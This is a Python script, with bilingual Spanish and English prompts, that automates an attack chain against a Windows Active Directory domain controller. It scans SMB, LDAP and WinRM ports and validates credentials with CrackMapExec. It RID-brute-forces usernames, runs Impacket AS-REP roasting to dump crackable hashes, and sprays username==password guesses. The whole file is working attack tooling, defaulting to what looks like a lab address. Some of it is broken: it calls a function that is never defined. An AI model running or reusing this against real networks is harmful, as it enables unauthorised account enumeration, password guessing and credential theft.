import shlex
import impacket
import subprocess
import shutil
import re
import getpass
import argparse
import sys
import os
import socket
import platform
from typing import Iterable, Optional, Tuple, List, Dict

# Colores ANSI (morado EN / azul ES). En Windows: pip install colorama
try:
    from colorama import init
    init()
except Exception:
    pass
PURPLE = "\033[35m"
BLUE = "\033[34m"
RESET = "\033[0m"

SERVICES: Dict[str, Tuple[int, ...]] = {
    "SMB":   (445,),
    "LDAP":  (389, 636),
    "WinRM": (5985, 5986),
}

CME_OK        = re.compile(r"(?:VALID|STATUS_SUCCESS|PASSWORD_MUST_CHANGE|STATUS_PASSWORD_MUST_CHANGE|PASSWORD_EXPIRED|STATUS_PASSWORD_EXPIRED)", re.I)
CME_FAIL      = re.compile(r"(?:NT_STATUS_LOGON_FAILURE|STATUS_LOGON_FAILURE|STATUS_ACCESS_DENIED|STATUS_ACCOUNT_DISABLED|STATUS_ACCOUNT_LOCKED_OUT)", re.I)
CME_ANON      = re.compile(r"(?:anonymous|null session|guest)", re.I)
CME_PWN       = re.compile(r"(?:Pwn3d!)", re.I)
CME_PWCHANGE  = re.compile(r"(?:PASSWORD_MUST_CHANGE|STATUS_PASSWORD_MUST_CHANGE|PASSWORD_EXPIRED|STATUS_PASSWORD_EXPIRED)", re.I)
CME_PLUS_LINE = re.compile(r"^\[\+\].*", re.M)

# ---------- Utilidades de red ----------
def ping_host(host: str, timeout_s: float = 1.5) -> Tuple[bool, Optional[int]]:
    """
    Hace 1 ping y devuelve: (reachable, ttl)
    - Windows: ping -n 1 -w 1000
    - Unix:    ping -c 1 -W 1
    """
    sysname = platform.system().lower()
    if "windows" in sysname:
        cmd = ["ping", "-n", "1", "-w", "1000", host]
    else:
        cmd = ["ping", "-c", "1", "-W", "1", host]

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout_s + 0.5)
    except Exception:
        return (False, None)

    out = (proc.stdout or "") + (("\n" + proc.stderr) if proc.stderr else "")
    # ttl=128 / TTL=128
    m = re.search(r"\bttl[=\s:]*([0-9]+)\b", out, re.IGNORECASE)
    ttl = int(m.group(1)) if m else None

    reachable = proc.returncode == 0 or ("bytes from" in out.lower() or "ttl=" in out.lower())
    return (reachable, ttl)

def check_tcp_port(host: str, port: int, timeout_s: float = 0.8) -> bool:
    """Conecta por TCP para ver si el puerto está abierto."""
    try:
        with socket.create_connection((host, port), timeout=timeout_s):
            return True
    except Exception:
        return False

def check_services(host: str) -> Dict[str, Dict[int, bool]]:
    """Devuelve {'SMB': {445: True/False}, 'LDAP': {389:..,636:..}, 'WinRM': {5985:..,5986:..}}"""
    res: Dict[str, Dict[int, bool]] = {}
    for svc, ports in SERVICES.items():
        res[svc] = {}
        for p in ports:
            res[svc][p] = check_tcp_port(host, p)
    return res

# ---------- Formato de tabla ----------
def print_port_table(svc_status: Dict[str, Dict[int, bool]]) -> None:
    rows = []
    for svc, ports in svc_status.items():
        for p, is_open in sorted(ports.items(), key=lambda x: x[0]):
            rows.append((svc, str(p), "abierto" if is_open else "cerrado"))

    # Anchuras dinámicas
    w_svc   = max(len("Servicio"), *(len(r[0]) for r in rows)) if rows else len("Servicio")
    w_port  = max(len("Puerto"),   *(len(r[1]) for r in rows)) if rows else len("Puerto")
    w_state = max(len("Estado"),   *(len(r[2]) for r in rows)) if rows else len("Estado")

    sep = f"+-{'-'*w_svc}-+-{'-'*w_port}-+-{'-'*w_state}-+"
    hdr = f"| {'Servicio'.ljust(w_svc)} | {'Puerto'.ljust(w_port)} | {'Estado'.ljust(w_state)} |"

    print(sep)
    print(hdr)
    print(sep)
    for svc, port, state in rows:
        print(f"| {svc.ljust(w_svc)} | {port.ljust(w_port)} | {state.ljust(w_state)} |")
    print(sep)

def build_cme_cmd(
    target: str,
    username: str,
    password: str,
    cme_path: str = "crackmapexec",
    extra_flags: Optional[Iterable[str] | str] = None
    ) -> List[str]:
    """
    Construye el comando base de CrackMapExec SMB.
    extra_flags puede ser lista (["--shares", "--local-auth"]) o cadena ("--shares -x whoami").
    """
    if shutil.which(cme_path) is None:
        raise FileNotFoundError(f"No encuentro '{cme_path}' en PATH. Instálalo o pasa --cme con la ruta completa.")

    cmd = [cme_path, "smb", target, "-u", username, "-p", password]
    if extra_flags:
        if isinstance(extra_flags, str):
            cmd += shlex.split(extra_flags)
        else:
            cmd += list(extra_flags)
    return cmd

def run_cme(cmd: List[str], timeout: int = 60) -> Tuple[int, str]:
    """
    Ejecuta un comando CME (lista) y devuelve (returncode, stdout+stderr).
    """
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        output = (proc.stdout or "") + (("\n" + proc.stderr) if proc.stderr else "")
        return proc.returncode, output
    except subprocess.TimeoutExpired:
        return 124, ""
    except Exception:
        return 1, ""

def check_smb_creds(
    target: str,
    username: str,
    password: str,
    cme_path: str = "crackmapexec",
    timeout: int = 60,
    extra_flags: Optional[Iterable[str] | str] = None,
    return_cmd: bool = False,
    return_meta: bool = False,
    ):
    cmd = build_cme_cmd(target, username, password, cme_path=cme_path, extra_flags=extra_flags)
    rc, output = run_cme(cmd, timeout)

    # ¿Entrada anónima?
    is_anon_input = (username == "" and (password == "" or password is None))

    success = False
    failure = False

    # Éxitos "reales": VALID / STATUS_SUCCESS / must-change / expired
    if CME_OK.search(output):
        success = True

    # Par user:pass explícito
    if username and password and re.search(r"\[\+\].*?%s:%s" % (re.escape(username), re.escape(password)), output):
        success = True

    # Pwn3d!
    if CME_PWN.search(output):
        success = True

    # (Solo para clasificación; NO activa 'success' para credenciales)
    is_anon_output = bool(CME_ANON.search(output))

    # Fallos
    if CME_FAIL.search(output):
        failure = True

    # Meta
    meta = None
    if return_meta:
        meta = {
            "must_change": bool(CME_PWCHANGE.search(output)),
            "anonymous":   bool(is_anon_input or is_anon_output),
            "pwned":       bool(CME_PWN.search(output)),
        }

    # Retornos
    if return_cmd and return_meta:
        if success and not failure: return True, output, rc, cmd, meta
        if failure and not success: return False, output, rc, cmd, meta
        return False, output, rc, cmd, meta

    if return_cmd and not return_meta:
        if success and not failure: return True, output, rc, cmd
        if failure and not success: return False, output, rc, cmd
        return False, output, rc, cmd

    if not return_cmd and return_meta:
        if success and not failure: return True, output, rc, meta
        if failure and not success: return False, output, rc, meta
        return False, output, rc, meta

    if success and not failure: return True, output, rc
    if failure and not success: return False, output, rc
    return False, output, rc

def cme_try_user_eq_pass_list(target: str,
                              users_path: str,
                              domain: str | None = None,
                              cme_path: str = "crackmapexec",
                              timeout: int = 120) -> tuple[int, str]:
    """
    Ejecuta:
      cme smb <target> [-d <domain>] -u <users.txt> -p <users.txt> --no-bruteforce --continue-on-success
    para probar usuario==password (pareo línea a línea).
    Devuelve (returncode, stdout+stderr).
    """
    if shutil.which(cme_path) is None:
        return 1, "[!] crackmapexec no encontrado en PATH."

    cmd = [cme_path, "smb", target]
    if domain and domain.upper() != "N/D":
        cmd += ["-d", domain]
    cmd += ["-u", users_path, "-p", users_path, "--no-bruteforce", "--continue-on-success"]
    return run_cme(cmd, timeout=timeout)

def parse_user_eq_pass_creds(output: str) -> list[str]:
    """
    Parsea líneas de éxito de CME y devuelve credenciales donde user==password,
    formateadas como 'DOMAIN\\user:user'.
    """
    creds: list[str] = []
    seen = set()
    # Busca "[+] ... DOMAIN\user:pass"
    for m in re.finditer(r"\[\+\].*?([A-Za-z0-9_.-]+)\\([A-Za-z0-9_.\-$]+):([^\s:]+)", output):
        dom, usr, pwd = m.group(1), m.group(2), m.group(3)
        if usr == pwd:
            line = f"{dom}\\{usr}:{pwd}"
            if line not in seen:
                seen.add(line)
                creds.append(line)
    return creds

def cme_get_domain(target: str, cme_path: str = "crackmapexec", timeout: int = 30) -> str | None:
    """
    Obtiene el dominio desde el banner de CME sin credenciales, equivalente a:
      cme smb <target> | grep -oP '(?<=domain:)[^)]+' | tr -d ' '
    """
    if shutil.which(cme_path) is None:
        return None
    cmd = [cme_path, "smb", target]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        out = (proc.stdout or "") + (("\n" + proc.stderr) if proc.stderr else "")
    except Exception:
        return None

    # Primero intenta el patrón exacto sugerido: todo tras 'domain:' hasta ')'
    m = re.search(r"(?<=domain:)[^)\r\n]+", out, re.IGNORECASE)
    if not m:
        # Respaldo: 'domain:' seguido de token típico de dominio
        m = re.search(r"\bdomain:([A-Za-z0-9._\-]+)", out, re.IGNORECASE)
    if not m:
        return None

    dom = m.group(0) if isinstance(m.group(0), str) else m.group(1)
    return dom.strip().replace(" ", "")

def extract_domain(output: str) -> Optional[str]:
    m = re.search(r"\(domain:([^)]+)\)", output)
    if m:
        return m.group(1).strip()
    m = re.search(r"\bdomain:([A-Za-z0-9.\-_]+)", output)
    if m:
        return m.group(1).strip()
    m = re.search(r"\[\+\].*?([A-Za-z0-9_.-]+)\\[A-Za-z0-9_.\-$]+", output)
    if m:
        return m.group(1).strip()
    return None

def extract_success_identity(output: str) -> Optional[str]:
    m = re.search(r"\[\+\].*?([A-Za-z0-9_.-]+\\[A-Za-z0-9_.\-$]+):", output)
    if m:
        return m.group(1).strip()
    m = re.search(r"\[\+\].*?([A-Za-z0-9_.-]+\\[A-Za-z0-9_.\-$]+)\b", output)
    if m:
        return m.group(1).strip()
    if re.search(r"anonymous|null session|guest", output, re.I):
        return "Anónimo/Guest"
    return None

def cme_rid_brute_from_cmd(cmd: list[str], timeout: int = 120) -> tuple[int, str]:
    """
    Reutiliza un comando base de CME y ejecuta RID brute:
      crackmapexec smb <target> -u <user> -p <pass> --rid-brute
    """
    enum_cmd = cmd + ["--rid-brute"]
    return run_cme(enum_cmd, timeout=timeout)

def parse_rid_brute_users(output: str) -> list[str]:
    """
    Emula: ... | grep SidTypeUser | cut -d '\\' -f 2 | cut -d ' ' -f 1
    Devuelve solo el 'usuario' (sin DOMINIO\\), uno por línea.
    """
    users: list[str] = []
    seen = set()

    # 1) Formato: DOMAIN\user ... SidTypeUser
    for m in re.finditer(r"([A-Za-z0-9_.-]+)\\([A-Za-z0-9_.\-$]+).*SidTypeUser", output, re.IGNORECASE):
        u = m.group(2)
        if u not in seen:
            seen.add(u)
            users.append(u)

    # 2) Alternativos: Name: user ... SidTypeUser   /   Account: user ... SidTypeUser
    for pat in (r"Name\s*:\s*([^\s,]+).*SidTypeUser", r"Account\s*:\s*([^\s,]+).*SidTypeUser"):
        for m in re.finditer(pat, output, re.IGNORECASE):
            u = m.group(1)
            if u not in seen:
                seen.add(u)
                users.append(u)

    return users

def save_users(users: list[str], path: str, append: bool = True) -> int:
    """
    Guarda usuarios en 'path' (uno por línea).
    Si append=True, emula '>> users.txt'.
    Devuelve cuántos usuarios se escribieron.
    """
    mode = "a" if append else "w"
    with open(path, mode, encoding="utf-8", errors="ignore") as f:
        for u in users:
            f.write(u + "\n")
    return len(users)

def build_getnpusers_cmd(domain: str, dc_ip: str,
                         users_file: str = "users.txt",
                         out_file: str = "asreproast.txt",
                         tool: str = "impacket-GetNPUsers") -> list[str]:
    """
    Construye el comando para Impacket GetNPUsers:
      impacket-GetNPUsers <DOMAIN>/ -dc-ip <IP> -usersfile <users.txt> -no-pass -format hashcat -outputfile <asreproast.txt>
    Intenta caer a 'GetNPUsers.py' si el wrapper no existe.
    """
    chosen = None
    for candidate in (tool, "GetNPUsers.py"):
        if shutil.which(candidate):
            chosen = candidate
            break
    if chosen is None:
        raise FileNotFoundError("No encuentro 'impacket-GetNPUsers' ni 'GetNPUsers.py' en PATH.")

    cmd = [
        chosen,
        f"{domain}/",
        "-dc-ip", dc_ip,
        "-usersfile", users_file,
        "-no-pass",
        "-format", "hashcat",
        "-outputfile", out_file
    ]
    return cmd

def run_getnpusers(cmd: list[str], timeout: int = 180) -> tuple[int, str]:
    """
    Ejecuta GetNPUsers y devuelve (returncode, stdout+stderr).
    """
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        output = (proc.stdout or "") + (("\n" + proc.stderr) if proc.stderr else "")
        return proc.returncode, output
    except subprocess.TimeoutExpired:
        return 124, ""
    except Exception:
        return 1, ""

def count_lines_if_exists(path: str) -> int:
    """
    Cuenta líneas del archivo si existe; si no existe, devuelve 0.
    """
    if not os.path.isfile(path):
        return 0
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return sum(1 for _ in f)
    except Exception:
        return 0


# ---------- Prompt ----------
def ask_have_valid_creds() -> bool:
    """
    Pregunta EN/ES (morado/azul) si ya se tienen credenciales válidas.
    Devuelve True si la respuesta fue sí/yes; False en otro caso.
    """
    try:
        print(PURPLE + "[EN] Do you already have a valid username and password? (y/n)" + RESET)
        print(BLUE   + "[ES] ¿Ya cuentas con usuario y contraseña válidos? (s/n)" + RESET)
        ans = input("Answer / Respuesta [y/n/s]: ").strip().lower()
        if ans in ("y", "yes", "s", "si", "sí"):
            return True
        elif ans in ("n", "no"):
            return False
    except KeyboardInterrupt:
        print("\n[!] Abortado por el usuario.")
        sys.exit(130)
    return False

def ask_enum_users() -> bool:
    """
    Pregunta EN/ES (morado/azul) si se desea ejecutar enumeración de usuarios.
    Devuelve True si la respuesta fue sí/yes; False en otro caso.
    Requiere variables ANSI: PURPLE, BLUE, RESET
    """
    try:
        print(PURPLE + "[EN] Do you want to enumerate users with the valid credentials? (y/n)" + RESET)
        print(BLUE   + "[ES] ¿Quieres enumerar usuarios con las credenciales válidas? (s/n)" + RESET)
        ans = input("Answer / Respuesta [y/n/s]: ").strip().lower()
        if ans in ("y", "yes", "s", "si", "sí"):
            return True
        elif ans in ("n", "no"):
            return False
    except KeyboardInterrupt:
        print("\n[!] Abortado por el usuario.")
        sys.exit(130)
    return False

def ask_have_valid_users() -> bool:
    """
    Pregunta EN/ES (morado/azul) si se cuenta con usuarios válidos para intentar AS-REProasting.
    Requiere variables ANSI: PURPLE, BLUE, RESET
    """
    try:
        print(PURPLE + "[EN] Do you have valid usernames to try Kerberos pre-auth disabled (AS-REP)? (y/n)" + RESET)
        print(BLUE   + "[ES] ¿Tienes usuarios válidos para intentar Kerberos pre-auth deshabilitado (AS-REP)? (s/n)" + RESET)
        ans = input("Answer / Respuesta [y/n/s]: ").strip().lower()
        return ans in ("y", "yes", "s", "si", "sí")
    except KeyboardInterrupt:
        print("\n[!] Abortado por el usuario.")
        sys.exit(130)

def ask_users_file(default_path: str = "users.txt") -> str:
    """
    Pide la ruta del wordlist de usuarios (EN/ES, colores) y verifica que exista.
    Devuelve una ruta válida. Reintenta hasta que el archivo exista.
    Requiere ANSI: PURPLE, BLUE, RESET y count_lines_if_exists().
    """
    while True:
        print(PURPLE + f"[EN] Provide path to the usernames wordlist (default: {default_path}). Press Enter to use default." + RESET)
        print(BLUE   + f"[ES] Proporciona la ruta del diccionario de usuarios (por defecto: {default_path}). Presiona Enter para usar el predeterminado." + RESET)
        path = input("Path / Ruta: ").strip()
        path = path if path else default_path

        if os.path.isfile(path):
            total = count_lines_if_exists(path)
            print(f"Usuarios a probar: {total} desde {path}")
            return path
        else:
            print(f"[!] No existe el archivo: {path}. Inténtalo de nuevo.")

def ask_try_user_eq_pass() -> bool:
    """
    Pregunta EN/ES (morado/azul) si se desea probar combos usuario==password
    usando la wordlist de usuarios (pareo 1:1 con --no-bruteforce).
    Requiere: PURPLE, BLUE, RESET
    """
    try:
        print(PURPLE + "[EN] Do you want to try username==password combos with your usernames list? (y/n)" + RESET)
        print(BLUE   + "[ES] ¿Quieres probar usuario==password con tu lista de usuarios? (s/n)" + RESET)
        ans = input("Answer / Respuesta [y/n/s]: ").strip().lower()
        return ans in ("y", "yes", "s", "si", "sí")
    except KeyboardInterrupt:
        print("\n[!] Abortado por el usuario.")
        sys.exit(130)

# ---------- Cases ----------

# ---------- Main ----------
def main():
    ap = argparse.ArgumentParser(description="Valida credenciales SMB con CrackMapExec (pre-checks + tabla de puertos + salida resumida).")
    ap.add_argument("-t", "--target", nargs="?", default="172.16.5.5", help="IP/host objetivo (por defecto: 172.16.5.5)")
    ap.add_argument("-u", "--username", default=None, help="Usuario (si omites -u y -p, se probará null session)")
    ap.add_argument("-p", "--password", default=None, help="Password (si omites -u y -p, se probará null session)")
    ap.add_argument("--cme", default="crackmapexec", help="Ruta/comando de CrackMapExec (por defecto: crackmapexec)")
    ap.add_argument("--timeout", type=int, default=60, help="Timeout en segundos (por defecto: 60)")
    args = ap.parse_args()

    # 1) PRE-CHECKS ANTES DE CUALQUIER COSA
    reachable, ttl = ping_host(args.target)
    ttl_note = ""
    if ttl in (127, 128):
        ttl_note = " (probable Windows)"
    elif ttl is not None:
        ttl_note = " (no Windows típico)"

    svc_status = check_services(args.target)

    print(f"Conectividad ICMP: {'Sí' if reachable else 'No'}")
    print(f"TTL: {ttl if ttl is not None else 'N/D'}{ttl_note}")
    print("Servicios detectados:")
    print_port_table(svc_status)  # ◀︎ tabla bonita

    # 2) Dominio por banner (sin credenciales)
    banner_domain = cme_get_domain(args.target, cme_path=args.cme)  # puede ser None

    # 3) Prompt EN/ES para decidir tipo de prueba (credenciales o null session)
    have_valid = ask_have_valid_creds()
    if have_valid:
        username = args.username if args.username is not None else input("Username / Usuario: ").strip()
        password = args.password if args.password is not None else getpass.getpass("Password / Contraseña: ")
    else:
        username = ""
        password = ""

    # 4) Validación con CME (sin imprimir su salida) – pedimos meta
    ok, out, rc, base_cmd, meta = check_smb_creds(
        args.target, username, password,
        cme_path=args.cme, timeout=args.timeout,
        return_cmd=True, return_meta=True
    )

    # 5) Dominio (preferir salida de CME; de lo contrario banner)
    domain = extract_domain(out) or banner_domain or "N/D"
    print(f"Dominio encontrado: {domain}")

    # Distinción clara:
    # - ok: hubo algún tipo de sesión (incluye anónimo)
    # - ok_creds: credenciales válidas (no anónimo)
    is_anon = bool(meta and meta.get("anonymous"))
    ok_creds = bool(ok and not is_anon)

    # 6) Resumen de acceso y acciones siguientes
    if ok_creds:
        ident = extract_success_identity(out)
        print(f"Acceso válido: {ident if ident else 'Sí'} ✅")
        if meta and meta.get("must_change"):
            print("Nota: La cuenta es válida pero la contraseña debe cambiarse / está expirada.")

        # Si el acceso fue válido y NO es sesión anónima, ofrece RID brute
        if ask_enum_users():
            rc_enum, out_enum = cme_rid_brute_from_cmd(base_cmd)
            users = parse_rid_brute_users(out_enum)
            if users:
                save_path = "users.txt"  # emula ">> users.txt"
                added = save_users(users, save_path, append=True)
                print(f"RID Brute: {len(users)} usuario(s) detectado(s). Guardados (+{added}) en {save_path}. Muestra (hasta 10):")
                for u in users[:10]:
                    print(f" - {u}")
                if len(users) > 10:
                    print(f" ... (+{len(users)-10} más)")
            else:
                print("RID Brute: sin usuarios o no parseables.")
        sys.exit(0)

    else:
        # No hay credenciales válidas (puede haber sido sesión anónima o fallo)
        if is_anon:
            print("Acceso válido: No (solo sesión anónima) ❌")
        else:
            print("Acceso válido: No ❌")

        # Si no hubo credenciales válidas, preguntar por usuarios y probar AS-REP
        if ask_have_valid_users():
            dom = domain if (domain and domain.upper() != "N/D") else prompt_domain_if_missing(domain)
            users_path = ask_users_file(default_path="users.txt")
            print("Validando Kerberos pre-authentication disabled")
            try:
                cmd_np = build_getnpusers_cmd(dom, args.target, users_path, "asreproast.txt")
            except FileNotFoundError as e:
                print(f"[!] {e}")
            else:
                rc_np, out_np = run_getnpusers(cmd_np, timeout=180)
                print("\n--- Impacket GetNPUsers output ---")
                print(out_np.strip() or "(sin salida)")
                print(f"Return code: {rc_np}")
                n_hashes = count_lines_if_exists("asreproast.txt")
                print(f"AS-REP hashes guardados en asreproast.txt: {n_hashes}")

        #(Opcional) intentar user==pass 1:1 si quieres, aquí mismo
        if ask_try_user_eq_pass():
             users_path = users_path if 'users_path' in locals() else ask_users_file(default_path="users.txt")
             rc_eq, out_eq = cme_try_user_eq_pass_list(args.target, users_path, domain, cme_path=args.cme, timeout=max(90, args.timeout))
             print("\n--- CME username==password output ---")
             print(out_eq.strip() or "(sin salida)")
             print(f"Return code: {rc_eq}")
             creds_eq = parse_user_eq_pass_creds(out_eq)
        #     ...

        sys.exit(1)

if __name__ == "__main__":
    main()
